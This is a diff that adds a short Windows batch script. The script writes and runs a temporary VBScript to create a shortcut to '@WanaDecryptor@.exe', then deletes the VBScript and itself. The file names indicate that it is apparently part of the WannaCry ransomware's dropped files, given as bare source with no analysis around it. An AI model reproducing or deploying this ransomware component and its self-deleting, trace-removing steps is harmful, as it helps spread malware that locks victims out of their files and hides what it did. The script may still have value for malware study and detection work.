@@ -1,0 +1,9 @@
+@echo off
+echo SET ow = WScript.CreateObject("WScript.Shell")> m.vbs
+echo SET om = ow.CreateShortcut("C:\@WanaDecryptor@.exe.lnk")>> m.vbs
+echo om.TargetPath = "C:\@WanaDecryptor@.exe">> m.vbs
+echo om.Save>> m.vbs
+cscript.exe //nologo m.vbs
+del m.vbs
+
+del /a %0
